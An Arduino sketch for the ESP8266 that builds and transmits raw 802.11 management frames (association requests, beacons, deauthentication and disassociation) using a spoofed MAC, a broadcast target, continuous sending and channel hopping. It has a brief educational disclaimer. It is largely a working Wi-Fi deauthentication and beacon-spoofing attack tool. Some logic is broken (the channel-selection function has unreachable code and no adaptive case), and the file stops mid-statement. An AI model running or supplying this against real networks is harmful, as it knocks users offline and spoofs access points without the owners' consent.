#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <user_interface.h>

// ESP8266 SDK function declarations
extern "C" {
    void ets_delay_us(uint32_t us);
    void system_soft_wdt_feed(void);
    
    #ifndef ICACHE_RAM_ATTR
    #define ICACHE_RAM_ATTR __attribute__((section(".iram.text")))
    #endif
}

#include "ieee80211_structs.h"

/**
 * ESP8266 Raw 802.11 Management Frame Transmission
 * 
 * This sketch demonstrates crafting and transmitting raw IEEE 802.11 management frames using 
 * ESP8266's low-level WiFi capabilities. Implements:
 * - Association Request frames
 * - Beacon frames
 * - Deauthentication frames
 * - Disassociation frames
 * 
 * WARNING: This code bypasses normal WiFi protocols and should ONLY be used for:
 * - Educational purposes
 * - Network security research
 * - Protocol analysis
 * 
 * IMPORTANT: Transmitting unauthorized packets may violate regulations in your region.
 * Always ensure compliance with local laws and regulations.
 */

// Global variables for frame management
uint16_t sequence_number = 0;

// Replace esp_random with ESP equivalent
#define esp_random() (*(volatile uint32_t*)0x3FF20E44)

// Global MAC addresses and channel
uint8_t wifi_channel = 1;

// Target AP MAC Address (replace with your target)
uint8_t target_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};  // Broadcast address
// Your spoofed MAC Address
uint8_t source_mac[6] = {0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC};

// Default SSID and channel
char ssid[33] = "TestNetwork";

// Frame type selection
enum FrameType {
  FRAME_ASSOC_REQ = 0,
  FRAME_BEACON,
  FRAME_DEAUTH,
  FRAME_DISASSOC
};
FrameType selected_frame = FRAME_ASSOC_REQ;

// Reason code for deauth/disassoc
uint16_t reason_code = 0x0001;

// Buffers for each frame type
ICACHE_RAM_ATTR uint8_t beacon_buffer[512] __attribute__((aligned(4)));
ICACHE_RAM_ATTR uint8_t deauth_buffer[512] __attribute__((aligned(4)));
ICACHE_RAM_ATTR uint8_t disassoc_buffer[512] __attribute__((aligned(4)));
/**
 * Build a raw 802.11 Beacon frame
 */
uint16_t build_beacon_packet(uint8_t* buffer, const uint8_t* bssid, const char* ssid, uint8_t channel) {
  memset(buffer, 0, 512);
  uint16_t pos = 0;
  // MAC Header
  ieee80211_mac_header_t* header = (ieee80211_mac_header_t*)buffer;
  header->frame_ctrl.protocol_version = 0;
  header->frame_ctrl.type = 0; // Management
  header->frame_ctrl.subtype = 8; // Beacon
  header->frame_ctrl.to_ds = 0;
  header->frame_ctrl.from_ds = 0;
  header->frame_ctrl.more_frag = 0;
  header->frame_ctrl.retry = 0;
  header->frame_ctrl.power_mgmt = 0;
  header->frame_ctrl.more_data = 0;
  header->frame_ctrl.protected_frame = 0;
  header->frame_ctrl.order = 0;
  header->duration_id = 0;
  memcpy(header->addr1, "\xff\xff\xff\xff\xff\xff", 6); // Broadcast
  memcpy(header->addr2, bssid, 6); // Source (BSSID)
  memcpy(header->addr3, bssid, 6); // BSSID
  header->seq_ctrl = sequence_number++ << 4;
  pos += sizeof(ieee80211_mac_header_t);
  // Fixed parameters
  // Timestamp (8 bytes, set to 0)
  for (int i = 0; i < 8; i++) buffer[pos++] = 0x00;
  // Beacon interval (0x0064 = 100 TU)
  buffer[pos++] = 0x64; buffer[pos++] = 0x00;
  // Capability info (ESS, short preamble)
  buffer[pos++] = 0x31; buffer[pos++] = 0x04;
  // SSID
  buffer[pos++] = 0x00; // Tag: SSID
  uint8_t ssid_len = strlen(ssid);
  buffer[pos++] = ssid_len;
  memcpy(buffer + pos, ssid, ssid_len); pos += ssid_len;
  // Supported Rates
  buffer[pos++] = 0x01; buffer[pos++] = 0x08;
  buffer[pos++] = 0x82; buffer[pos++] = 0x84; buffer[pos++] = 0x8B; buffer[pos++] = 0x96;
  buffer[pos++] = 0x0C; buffer[pos++] = 0x12; buffer[pos++] = 0x18; buffer[pos++] = 0x24;
  // Extended Supported Rates (optional, but helps compatibility)
  buffer[pos++] = 0x32; buffer[pos++] = 0x04;
  buffer[pos++] = 0x30; buffer[pos++] = 0x48; buffer[pos++] = 0x60; buffer[pos++] = 0x6C;
  // DS Parameter Set
  buffer[pos++] = 0x03; buffer[pos++] = 0x01; buffer[pos++] = channel;
  // TIM (minimal, required for beacon)
  buffer[pos++] = 0x05; buffer[pos++] = 0x04; buffer[pos++] = 0x00; buffer[pos++] = 0x01; buffer[pos++] = 0x00; buffer[pos++] = 0x00;
  // Country Information (optional, but helps with some clients)
  buffer[pos++] = 0x07; buffer[pos++] = 0x06; buffer[pos++] = 'U'; buffer[pos++] = 'S'; buffer[pos++] = 0x01; buffer[pos++] = 0x01; buffer[pos++] = 0x0B; buffer[pos++] = 0x0B;
  return pos;
}

/**
 * Build a raw 802.11 Deauthentication frame
 */
uint16_t build_deauth_packet(uint8_t* buffer, const uint8_t* dst, const uint8_t* src, const uint8_t* bssid, uint16_t reason) {
  memset(buffer, 0, 512);
  uint16_t pos = 0;
  ieee80211_mac_header_t* header = (ieee80211_mac_header_t*)buffer;
  header->frame_ctrl.protocol_version = 0;
  header->frame_ctrl.type = 0; // Management
  header->frame_ctrl.subtype = 12; // Deauthentication
  header->frame_ctrl.to_ds = 0;
  header->frame_ctrl.from_ds = 0;
  header->frame_ctrl.more_frag = 0;
  header->frame_ctrl.retry = 0;
  header->frame_ctrl.power_mgmt = 0;
  header->frame_ctrl.more_data = 0;
  header->frame_ctrl.protected_frame = 0;
  header->frame_ctrl.order = 0;
  header->duration_id = 0;
  memcpy(header->addr1, dst, 6);
  memcpy(header->addr2, src, 6);
  memcpy(header->addr3, bssid, 6);
  header->seq_ctrl = sequence_number++ << 4;
  pos += sizeof(ieee80211_mac_header_t);
  // Reason code (2 bytes, little endian)
  buffer[pos++] = reason & 0xFF;
  buffer[pos++] = (reason >> 8) & 0xFF;
  // (Optional) add supported rates for some APs/clients
  // buffer[pos++] = 0x01; buffer[pos++] = 0x08;
  // buffer[pos++] = 0x82; buffer[pos++] = 0x84; buffer[pos++] = 0x8B; buffer[pos++] = 0x96;
  // buffer[pos++] = 0x0C; buffer[pos++] = 0x12; buffer[pos++] = 0x18; buffer[pos++] = 0x24;
  return pos;
}

/**
 * Build a raw 802.11 Disassociation frame
 */
uint16_t build_disassoc_packet(uint8_t* buffer, const uint8_t* dst, const uint8_t* src, const uint8_t* bssid, uint16_t reason) {
  memset(buffer, 0, 512);
  uint16_t pos = 0;
  ieee80211_mac_header_t* header = (ieee80211_mac_header_t*)buffer;
  header->frame_ctrl.protocol_version = 0;
  header->frame_ctrl.type = 0; // Management
  header->frame_ctrl.subtype = 10; // Disassociation
  header->frame_ctrl.to_ds = 0;
  header->frame_ctrl.from_ds = 0;
  header->frame_ctrl.more_frag = 0;
  header->frame_ctrl.retry = 0;
  header->frame_ctrl.power_mgmt = 0;
  header->frame_ctrl.more_data = 0;
  header->frame_ctrl.protected_frame = 0;
  header->frame_ctrl.order = 0;
  header->duration_id = 0;
  memcpy(header->addr1, dst, 6);
  memcpy(header->addr2, src, 6);
  memcpy(header->addr3, bssid, 6);
  header->seq_ctrl = sequence_number++ << 4;
  pos += sizeof(ieee80211_mac_header_t);
  // Reason code (2 bytes, little endian)
  buffer[pos++] = reason & 0xFF;
  buffer[pos++] = (reason >> 8) & 0xFF;
  // (Optional) add supported rates for some APs/clients
  // buffer[pos++] = 0x01; buffer[pos++] = 0x08;
  // buffer[pos++] = 0x82; buffer[pos++] = 0x84; buffer[pos++] = 0x8B; buffer[pos++] = 0x96;
  // buffer[pos++] = 0x0C; buffer[pos++] = 0x12; buffer[pos++] = 0x18; buffer[pos++] = 0x24;
  return pos;
}

// Global variables
uint8_t channel_scan = 1;

// Memory aligned buffer for packet construction (aligned for DMA operations)
ICACHE_RAM_ATTR uint8_t packet_buffer[512] __attribute__((aligned(4)));

// Debug flag
bool debug_mode = true;

// Channel hopping configuration
#define MIN_CHANNEL 1
#define MAX_CHANNEL 14
#define DWELL_TIME 50  // ms per channel
#define CHANNEL_SWITCH_DELAY 5  // ms

// Channel statistics for adaptive hopping
struct ChannelStats {
    uint32_t last_success;    // Timestamp of last successful transmission
    uint8_t fail_count;       // Consecutive failures
    uint8_t busy_count;       // Times channel was found busy
    bool blacklisted;         // Temporary blacklist flag
} channel_stats[MAX_CHANNEL + 1];

// Channel selection strategy
enum HoppingStrategy {
    SEQUENTIAL,      // Simple 1->14 sequence
    ADAPTIVE,        // Based on success rate
    RANDOM          // Random channel selection
} hopping_strategy = ADAPTIVE;

/**
 * Interpret transmission status codes
 */
const char* get_tx_status_string(int status) {
  switch(status) {
    case 0: return "Success";
    case 1: return "Error: Invalid packet structure";
    case 2: return "Error: Wrong channel";
    case 3: return "Error: Hardware not ready";
    case 4: return "Error: Transmission timeout";
    default: return "Unknown error";
  }
}

/**
 * Check if hardware is ready for transmission
 */
bool check_hardware_ready() {
  uint32_t status = READ_PERI_REG(0x60000914);
  return (status & 0x00000001) == 0;
}

/**
 * Parse MAC address from string format (XX:XX:XX:XX:XX:XX)
 */
bool parse_mac_address(const char* mac_str, uint8_t* mac_bytes) {
  uint8_t values[6];
  int items = sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                     &values[0], &values[1], &values[2],
                     &values[3], &values[4], &values[5]);
  
  if (items == 6) {
    memcpy(mac_bytes, values, 6);
    return true;
  }
  return false;
}

/**
 * Builds an 802.11 Association Request packet that conforms precisely to IEEE standards
 * @param buffer The buffer to store the packet
 * @param dst_addr Destination MAC address (AP)
 * @param src_addr Source MAC address (Station)
 * @param ssid The SSID to associate with
 * @param channel The WiFi channel to operate on
 * @return The size of the generated packet
 */
uint16_t build_association_packet(uint8_t* buffer, const uint8_t* dst_addr, 
                                 const uint8_t* src_addr, const char* ssid, uint8_t channel) {
  memset(buffer, 0, 512);  // Clear buffer
  uint16_t pos = 0;
  
  // ----- MAC Header -----
  ieee80211_mac_header_t* header = (ieee80211_mac_header_t*)buffer;
  
  // Frame Control Field - Must be exactly as per 802.11 standard for Association Request
  header->frame_ctrl.protocol_version = 0;
  header->frame_ctrl.type = 0;  // Management frame
  header->frame_ctrl.subtype = 0;  // Association Request
  header->frame_ctrl.to_ds = 0;
  header->frame_ctrl.from_ds = 0;
  header->frame_ctrl.more_frag = 0;
  header->frame_ctrl.retry = 0;
  header->frame_ctrl.power_mgmt = 0;
  header->frame_ctrl.more_data = 0;
  header->frame_ctrl.protected_frame = 0;
  header->frame_ctrl.order = 0;
  
  // Duration ID
  header->duration_id = 0;  // In little-endian byte order
  
  // Addresses
  memcpy(header->addr1, dst_addr, 6);  // Destination/AP MAC (BSSID)
  memcpy(header->addr2, src_addr, 6);  // Source/Station MAC
  memcpy(header->addr3, dst_addr, 6);  // BSSID (same as destination for Association)
  
  // Sequence Control - Increment for each new frame
  header->seq_ctrl = sequence_number++ << 4;  // Upper 12 bits are sequence number, lower 4 are fragment number
  
  pos += sizeof(ieee80211_mac_header_t);
  
  // ----- Frame Body -----
  
  // Fixed Parameters
  assoc_fixed_params_t* fixed_params = (assoc_fixed_params_t*)(buffer + pos);
  
  // Capability Information - Little endian byte order
  fixed_params->capability_info = 0x0011;  // ESS (bit 0) + Privacy (bit 4)
  
  // Listen Interval - Little endian byte order
  fixed_params->listen_interval = 0x000A;  // 10 beacon intervals
  
  pos += sizeof(assoc_fixed_params_t);
  
  // ----- Tagged Parameters (Information Elements) -----
  
  // SSID Parameter - MANDATORY
  buffer[pos++] = 0x00;  // Element ID: SSID
  uint8_t ssid_len = strlen(ssid);
  buffer[pos++] = ssid_len;  // Length
  memcpy(buffer + pos, ssid, ssid_len);
  pos += ssid_len;
  
  // Supported Rates - MANDATORY
  buffer[pos++] = 0x01;  // Element ID: Supported Rates
  buffer[pos++] = 0x08;  // Length
  // Note: MSB (bit 7) set indicates a Basic Rate
  buffer[pos++] = 0x82;  // 1 Mbps (basic rate)
  buffer[pos++] = 0x84;  // 2 Mbps (basic rate)
  buffer[pos++] = 0x8B;  // 5.5 Mbps (basic rate)
  buffer[pos++] = 0x96;  // 11 Mbps (basic rate)
  buffer[pos++] = 0x0C;  // 6 Mbps
  buffer[pos++] = 0x12;  // 9 Mbps
  buffer[pos++] = 0x18;  // 12 Mbps
  buffer[pos++] = 0x24;  // 18 Mbps
  
  // Extended Supported Rates - OPTIONAL but recommended
  buffer[pos++] = 0x32;  // Element ID: Extended Supported Rates
  buffer[pos++] = 0x04;  // Length
  buffer[pos++] = 0x30;  // 24 Mbps
  buffer[pos++] = 0x48;  // 36 Mbps
  buffer[pos++] = 0x60;  // 48 Mbps
  buffer[pos++] = 0x6C;  // 54 Mbps
  
  // HT Capabilities - OPTIONAL, for 802.11n
  buffer[pos++] = 0x2D;  // Element ID: HT Capabilities
  buffer[pos++] = 0x1A;  // Length: 26 bytes
  buffer[pos++] = 0x01; buffer[pos++] = 0x00;  // HT Capabilities Info
  buffer[pos++] = 0x00;  // A-MPDU Parameters
  // Supported MCS Set (16 bytes)
  buffer[pos++] = 0xFF; buffer[pos++] = 0xFF; // MCS 0-15 supported
  buffer[pos++] = 0x00; buffer[pos++] = 0x00;
  buffer[pos++] = 0x00; buffer[pos++] = 0x00;
  buffer[pos++] = 0x00; buffer[pos++] = 0x00;
  buffer[pos++] = 0x00; buffer[pos++] = 0x00;
  buffer[pos++] = 0x00; buffer[pos++] = 0x00;
  // HT Extended Capabilities
  buffer[pos++] = 0x00; buffer[pos++] = 0x00;
  // Transmit Beamforming Capabilities
  buffer[pos++] = 0x00; buffer[pos++] = 0x00; buffer[pos++] = 0x00; buffer[pos++] = 0x00;
  // ASEL Capabilities
  buffer[pos++] = 0x00;
  
  // Power Capability - OPTIONAL but helps
  buffer[pos++] = 0x21;  // Element ID: Power Capability
  buffer[pos++] = 0x02;  // Length
  buffer[pos++] = 0x00;  // Minimum Transmit Power Capability
  buffer[pos++] = 0x64;  // Maximum Transmit Power Capability (100 dBm)
  
  // Supported Channels - OPTIONAL but helps
  buffer[pos++] = 0x24;  // Element ID: Supported Channels
  buffer[pos++] = 0x02;  // Length
  buffer[pos++] = 0x01;  // First Channel (1)
  buffer[pos++] = 0x0B;  // Number of Channels (11)

  // DS Parameter Set - CRITICAL for channel setting
  buffer[pos++] = 0x03;  // Element ID: DS Parameter Set
  buffer[pos++] = 0x01;  // Length
  buffer[pos++] = channel;  // Current Channel

  // Note: FCS (4 bytes) is calculated and appended by hardware
  
  return pos;  // Return length excluding FCS
}

/**
 * Low-level transmission function using the ESP8266's built-in hardware
 * This uses the vendor-specific register layout to directly control the WiFi chip
 * @param packet Pointer to the packet buffer
 * @param length Length of the packet (excluding FCS)
 * @param rate Transmission rate (1=1Mbps, 2=2Mbps, 5=5.5Mbps, 11=11Mbps, etc.)
 * @param channel WiFi channel to transmit on (1-14)
 */
ICACHE_RAM_ATTR bool transmit_raw_packet(const uint8_t* packet, uint16_t length, uint8_t rate, uint8_t channel) {
  if (!packet || length == 0 || length > 1500) return false;
  
  // Save current state and disable interrupts
  uint8_t old_op_mode = wifi_get_opmode();
  noInterrupts();

  // Switch to station mode and set channel
  wifi_set_opmode(STATION_MODE);
  if (!wifi_set_channel((uint8)channel)) {
    interrupts();
    return false;
  }
  
  // Wait for channel switch and feed watchdog
  os_delay_us(1000);
  system_soft_wdt_feed();
  
  // Prepare packet for transmission
  bool result = false;
  
  // Create a non-const buffer for wifi_send_pkt_freedom
  uint8* tx_buffer = (uint8*)malloc(length);
  if (tx_buffer) {
    memcpy(tx_buffer, packet, length);
    result = wifi_send_pkt_freedom(tx_buffer, (int)length, false) == 0;
    free(tx_buffer);
  }
  
  // Restore previous mode and re-enable interrupts
  wifi_set_opmode(old_op_mode);
  interrupts();
  
  return result;
}

/**
 * Print packet details for debugging
 */
void print_packet_details(const uint8_t* packet, uint16_t length) {
  Serial.println("\n--- 802.11 Packet Details ---");
  
  // Parse frame control field from first two bytes
  frame_control_t* fc = (frame_control_t*)packet;
  Serial.printf("Frame Control: Protocol=%d, Type=%d, Subtype=%d\n", 
                fc->protocol_version, fc->type, fc->subtype);
  Serial.printf("Flags: ToDS=%d, FromDS=%d, MoreFrag=%d, Retry=%d, PwrMgmt=%d, MoreData=%d, Protected=%d, Order=%d\n",
                fc->to_ds, fc->from_ds, fc->more_frag, fc->retry, 
                fc->power_mgmt, fc->more_data, fc->protected_frame, fc->order);
  
  // Duration
  uint16_t duration = packet[2] | (packet[3] << 8);
  Serial.printf("Duration: %d\n", duration);
  
  // Addresses
  Serial.printf("Address1 (Receiver): %02X:%02X:%02X:%02X:%02X:%02X\n", 
                packet[4], packet[5], packet[6], packet[7], packet[8], packet[9]);
  Serial.printf("Address2 (Transmitter): %02X:%02X:%02X:%02X:%02X:%02X\n", 
                packet[10], packet[11], packet[12], packet[13], packet[14], packet[15]);
  Serial.printf("Address3 (BSSID): %02X:%02X:%02X:%02X:%02X:%02X\n", 
                packet[16], packet[17], packet[18], packet[19], packet[20], packet[21]);
  
  // Sequence Control
  uint16_t seq_ctrl = packet[22] | (packet[23] << 8);
  uint16_t seq_num = seq_ctrl >> 4;
  uint8_t frag_num = seq_ctrl & 0x0F;
  Serial.printf("Sequence: %d, Fragment: %d\n", seq_num, frag_num);
  
  // For association request, fixed parameters follow
  if (fc->type == 0 && fc->subtype == 0) {
    uint16_t capability = packet[24] | (packet[25] << 8);
    uint16_t listen_interval = packet[26] | (packet[27] << 8);
    Serial.printf("Capability Info: 0x%04X\n", capability);
    Serial.printf("Listen Interval: %d\n", listen_interval);
    
    // Tagged parameters start at offset 28
    uint16_t offset = 28;
    while (offset < length - 2) {  // Need at least ID and length
      uint8_t id = packet[offset++];
      uint8_t len = packet[offset++];
      
      // Make sure we don't read past the end of the packet
      if (offset + len > length) break;
      
      switch (id) {
        case 0:  // SSID
          Serial.print("SSID: ");
          for (int i = 0; i < len; i++) {
            Serial.write(packet[offset + i]);
          }
          Serial.println();
          break;
          
        case 1:  // Supported Rates
          Serial.print("Supported Rates: ");
          for (int i = 0; i < len; i++) {
            float rate = (packet[offset + i] & 0x7F) * 0.5;
            Serial.printf("%.1f%s ", rate, (packet[offset + i] & 0x80) ? "(B)" : "");
          }
          Serial.println();
          break;
          
        case 3:  // DS Parameter Set
          Serial.printf("DS Parameter Set: Channel %d\n", packet[offset]);
          break;
          
        case 0x32:  // Extended Supported Rates
          Serial.print("Extended Rates: ");
          for (int i = 0; i < len; i++) {
            float rate = (packet[offset + i] & 0x7F) * 0.5;
            Serial.printf("%.1f%s ", rate, (packet[offset + i] & 0x80) ? "(B)" : "");
          }
          Serial.println();
          break;
          
        default:
          Serial.printf("Element ID: %d, Length: %d\n", id, len);
          break;
      }
      
      offset += len;
    }
  }
  
  Serial.println("--- End of Packet Details ---\n");
}

uint8_t next_channel(uint8_t current_channel) {
    uint8_t best_channel = current_channel;
    uint8_t lowest_fails = 255;
    uint8_t new_channel = current_channel;

    switch(hopping_strategy) {
        case SEQUENTIAL:
            return (current_channel >= MAX_CHANNEL) ? MIN_CHANNEL : current_channel + 1;
            
            for(uint8_t ch = MIN_CHANNEL; ch <= MAX_CHANNEL; ch++) {
                if(!channel_stats[ch].blacklisted && 
                   channel_stats[ch].fail_count < lowest_fails) {
                    lowest_fails = channel_stats[ch].fail_count;
                    best_channel = ch;
                }
            }
            return best_channel;
            
        case RANDOM:
            // Avoid current channel and blacklisted ones
            uint8_t new_channel;
            do {
                new_channel = MIN_CHANNEL + (esp_random() % (MAX_CHANNEL - MIN_CHANNEL + 1));
            } while(new_channel == current_channel || 
                   channel_stats[new_channel].blacklisted);
            return new_channel;
    }
    return current_channel;  // Fallback
}

void update_channel_stats(uint8_t channel, bool success) {
    if(success) {
        channel_stats[channel].last_success = millis();
        channel_stats[channel].fail_count = 0;
        channel_stats[channel].blacklisted = false;
    } else {
        channel_stats[channel].fail_count++;
        
        // Blacklist channel if too many failures
        if(channel_stats[channel].fail_count > 5) {
            channel_stats[channel].blacklisted = true;
            // Reset blacklist after 5 seconds
            static unsigned long blacklist_timer = millis();
            if(millis() - blacklist_timer > 5000) {
                for(uint8_t i = MIN_CHANNEL; i <= MAX_CHANNEL; i++) {
                    channel_stats[i].blacklisted = false;
                }
                blacklist_timer = millis();
            }
        }
    }
}

bool is_channel_clear(uint8_t channel) {
    // Check if channel is free using RSSI
    int32_t rssi = WiFi.RSSI();
    const int32_t RSSI_THRESHOLD = -65;  // Adjust based on environment
    
    if (rssi == 0) {
        // RSSI not available, assume channel is clear
        return true;
    }
    
    if (rssi > RSSI_THRESHOLD) {
        channel_stats[channel].busy_count++;
        return false;
    }
    return true;
}

// Channel management helper functions
void initialize_channel_stats() {
    for (uint8_t i = MIN_CHANNEL; i <= MAX_CHANNEL; i++) {
        channel_stats[i].last_success = 0;
        channel_stats[i].fail_count = 0;
        channel_stats[i].busy_count = 0;
        channel_stats[i].blacklisted = false;
    }
}

void update_channel_strategy() {
    static unsigned long last_strategy_update = 0;
    static uint8_t consecutive_failures = 0;
    
    if (millis() - last_strategy_update > 10000) {  // Update strategy every 10 seconds
        uint8_t total_blacklisted = 0;
        uint8_t high_failure_channels = 0;
        
        for (uint8_t i = MIN_CHANNEL; i <= MAX_CHANNEL; i++) {
            if (channel_stats[i].blacklisted) total_blacklisted++;
            if (channel_stats[i].fail_count > 3) high_failure_channels++;
        }
        
        // Adjust strategy based on channel conditions
        if (total_blacklisted > MAX_CHANNEL / 2) {
            hopping_strategy = RANDOM;  // Try random hopping if many channels are blocked
            // Reset blacklist
            for (uint8_t i = MIN_CHANNEL; i <= MAX_CHANNEL; i++) {
                channel_stats[i].blacklisted = false;
            }
        } else if (high_failure_channels > MAX_CHANNEL / 3) {
            hopping_strategy = ADAPTIVE;  // Use adaptive if many channels have high failure
        } else {
            hopping_strategy = SEQUENTIAL;  // Default to sequential if conditions are good
        }
        
        last_strategy_update = millis();
    }
}

bool perform_channel_hop(uint8_t& current_channel) {
    static uint8_t retry_count = 0;
    const uint8_t MAX_RETRIES = 3;
    bool found_clear_channel = false;
    
    while (!found_clear_channel && retry_count < MAX_RETRIES) {
        uint8_t next_ch = next_channel(current_channel);
        if (wifi_set_channel((uint8)next_ch)) {
            delayMicroseconds(500); // Let channel settle
            
            if (is_channel_clear(next_ch)) {
                current_channel = next_ch;
                found_clear_channel = true;
                retry_count = 0;
                break;
            }
        }
        
        retry_count++;
        channel_stats[next_ch].busy_count++;
        
        if (retry_count >= MAX_RETRIES) {
            // Force channel change if we can't find a clear one
            current_channel = next_ch;
            found_clear_channel = true;
            retry_count = 0;
        }
    }
    
    return found_clear_channel;
}


// Build and transmit the selected frame type
bool attempt_transmission(uint8_t current_channel) {
    static uint8_t retry_count = 0;
    const uint8_t MAX_TX_RETRIES = 3;
    bool success = false;
    uint16_t packet_size = 0;
    uint8_t* tx_buffer = packet_buffer;
    const char* tx_ssid = ssid;
    uint8_t tx_channel = current_channel;
    uint8_t tx_rate = 2; // 1 Mbps

    while (retry_count < MAX_TX_RETRIES && !success) {
        if (!check_hardware_ready()) {
            delay(1);
            continue;
        }

        switch (selected_frame) {
            case FRAME_ASSOC_REQ:
                packet_size = build_association_packet(packet_buffer, target_mac, source_mac, tx_ssid, tx_channel);
                tx_buffer = packet_buffer;
                break;
            case FRAME_BEACON:
                packet_size = build_beacon_packet(beacon_buffer, source_mac, tx_ssid, tx_channel);
                tx_buffer = beacon_buffer;
                break;
            case FRAME_DEAUTH:
                packet_size = build_deauth_packet(deauth_buffer, target_mac, source_mac, target_mac, reason_code);
                tx_buffer = deauth_buffer;
                break;
            case FRAME_DISASSOC:
                packet_size = build_disassoc_packet(disassoc_buffer, target_mac, source_mac, target_mac, reason_code);
                tx_buffer = disassoc_buffer;
                break;
            default:
                packet_size = build_association_packet(packet_buffer, target_mac, source_mac, tx_ssid, tx_channel);
                tx_buffer = packet_buffer;
                break;
        }

        success = transmit_raw_packet(tx_buffer, packet_size, tx_rate, tx_channel);

        if (!success) {
            retry_count++;
            delayMicroseconds(random(500, 1500)); // Random backoff
        } else {
            retry_count = 0;
        }
    }

    update_channel_stats(current_channel, success);
    return success;
}


void setup() {
  // Initialize serial for debugging
  Serial.begin(115200);
  delay(1000);
  Serial.println("\n\nESP8266 Raw 802.11 Management Frame Transmitter");
  Serial.println("This sketch crafts and transmits raw 802.11 management frames");
  Serial.println("==================================================================");

  // Initialize channel statistics
  initialize_channel_stats();

  // Configure ESP8266 as a station
  wifi_set_opmode(STATION_MODE);

  // Disable automatic connections
  wifi_station_disconnect();
  wifi_station_set_auto_connect(0);

  // Set MAC address if necessary
  wifi_set_macaddr(STATION_IF, source_mac);

  // Initialize WiFi channel
  wifi_channel = 1;  // Start on channel 1

  // Build initial packet for selected frame type
  uint16_t packet_size = 0;
  switch (selected_frame) {
    case FRAME_ASSOC_REQ:
      packet_size = build_association_packet(packet_buffer, target_mac, source_mac, ssid, wifi_channel);
      break;
    case FRAME_BEACON:
      packet_size = build_beacon_packet(beacon_buffer, source_mac, ssid, wifi_channel);
      break;
    case FRAME_DEAUTH:
      packet_size = build_deauth_packet(deauth_buffer, target_mac, source_mac, target_mac, reason_code);
      break;
    case FRAME_DISASSOC:
      packet_size = build_disassoc_packet(disassoc_buffer, target_mac, source_mac, target_mac, reason_code);
      break;
    default:
      packet_size = build_association_packet(packet_buffer, target_mac, source_mac, ssid, wifi_channel);
      break;
  }

  Serial.printf("Initial frame type: %d, packet size: %d bytes\n", selected_frame, packet_size);

  if (debug_mode) {
    Serial.println("Packet hex dump:");
    uint8_t* dbg_buf = packet_buffer;
    if (selected_frame == FRAME_BEACON) dbg_buf = beacon_buffer;
    else if (selected_frame == FRAME_DEAUTH) dbg_buf = deauth_buffer;
    else if (selected_frame == FRAME_DISASSOC) dbg_buf = disassoc_buffer;
    for (int i = 0; i < packet_size; i++) {
      if (i % 16 == 0) Serial.printf("\n%04X: ", i);
      Serial.printf("%02X ", dbg_buf[i]);
    }
    Serial.println("\n");
    print_packet_details(dbg_buf, packet_size);
  }

  delay(2000);  // Wait 2 seconds before transmitting

  Serial.println("Transmitting initial frame...");
  bool tx_result = false;
  uint8_t* tx_buf = packet_buffer;
  if (selected_frame == FRAME_BEACON) tx_buf = beacon_buffer;
  else if (selected_frame == FRAME_DEAUTH) tx_buf = deauth_buffer;
  else if (selected_frame == FRAME_DISASSOC) tx_buf = disassoc_buffer;
  tx_result = transmit_raw_packet(tx_buf, packet_size, 2, wifi_channel);

  if (tx_result) {
    Serial.println("Transmission successful!");
  } else {
    Serial.println("Transmission failed! Error in packet structure or hardware access.");
    Serial.println("Try adjusting packet structure according to IEEE 802.11 standard.");
  }

  Serial.println("\nAvailable commands:");
  Serial.println("t - Trigger manual transmission");
  Serial.println("c - Toggle continuous mode");
  Serial.println("d - Toggle debug mode");
  Serial.println("h - Show this help");
  Serial.println("s - Show current status");
  Serial.println("1-9 - Set WiFi channel");
  Serial.println("m - Change target MAC address");
  Serial.println("f - Select frame type");
  Serial.println("n - Set SSID");
  Serial.println("r - Set reason code (deauth/disassoc)");
}

void loop() {
  static unsigned long last_tx = 0;
  static unsigned long last_hop = 0;
  static uint8_t current_channel = 1;
  static bool continuous_mode = false;
  unsigned long now = millis();
  
  // Update channel hopping strategy based on conditions
  update_channel_strategy();
  // Channel hopping timing
  if (now - last_hop >= DWELL_TIME) {
    bool clear_channel = perform_channel_hop(wifi_channel);
    last_hop = now;
    
    if (debug_mode) {
      Serial.printf("Hopped to channel %d (Channel %s)\n", 
                   wifi_channel,
                   clear_channel ? "clear" : "busy");
    }
  }
  
  // Handle continuous transmission mode
  if (continuous_mode && (now - last_tx > CHANNEL_SWITCH_DELAY)) {
    if (!check_hardware_ready()) {
      Serial.println("Hardware busy, skipping transmission");
      return;
    }
      // Attempt transmission with retries and backoff
    bool tx_result = attempt_transmission(current_channel);
    
    if (debug_mode) {
        Serial.printf("Transmission attempt on channel %d: %s\n", 
                     current_channel,
                     tx_result ? "SUCCESS" : "FAILED");
        Serial.printf("Channel stats - Fails: %d, Busy: %d, Blacklisted: %s\n",
                     channel_stats[current_channel].fail_count,
                     channel_stats[current_channel].busy_count,
                     channel_stats[current_channel].blacklisted ? "Yes" : "No");
    }
    
    int status = tx_result ? 0 : 1;
    Serial.printf("Transmission %s: %s\n", 
                 tx_result ? "successful" : "failed",
                 get_tx_status_string(status));
      if (debug_mode && tx_result) {
      uint16_t dbg_packet_size = 0;
      switch (selected_frame) {
        case FRAME_BEACON:
          dbg_packet_size = build_beacon_packet(beacon_buffer, source_mac, ssid, current_channel);
          print_packet_details(beacon_buffer, dbg_packet_size);
          break;
        case FRAME_DEAUTH:
          dbg_packet_size = build_deauth_packet(deauth_buffer, target_mac, source_mac, target_mac, reason_code);
          print_packet_details(deauth_buffer, dbg_packet_size);
          break;
        case FRAME_DISASSOC:
          dbg_packet_size = build_disassoc_packet(disassoc_buffer, target_mac, source_mac, target_mac, reason_code);
          print_packet_details(disassoc_buffer, dbg_packet_size);
          break;
        default:
          dbg_packet_size = build_association_packet(packet_buffer, target_mac, source_mac, ssid, current_channel);
          print_packet_details(packet_buffer, dbg_packet_size);
          break;
      }
    }
    
    // Channel hopping
    channel_scan = next_channel(channel_scan);
    last_tx = now;
  }
  
  // Handle serial commands
  if (Serial.available()) {
    char cmd = Serial.read();
    uint16_t packet_size = 0;
    
    // Frame type selection helper
    auto select_frame_type = [&]() {
      Serial.println("Select frame type:");
      Serial.println("0 - Association Request");
      Serial.println("1 - Beacon");
      Serial.println("2 - Deauthentication");
      Serial.println("3 - Disassociation");
      while (!Serial.available());
      char ftype = Serial.read();
      if (ftype >= '0' && ftype <= '3') {
        selected_frame = (FrameType)(ftype - '0');
        Serial.printf("Frame type set to %d\n", selected_frame);
      } else {
        Serial.println("Invalid frame type");
      }
    };
    
    switch(cmd) {
      case 't': // Trigger single transmission
        {
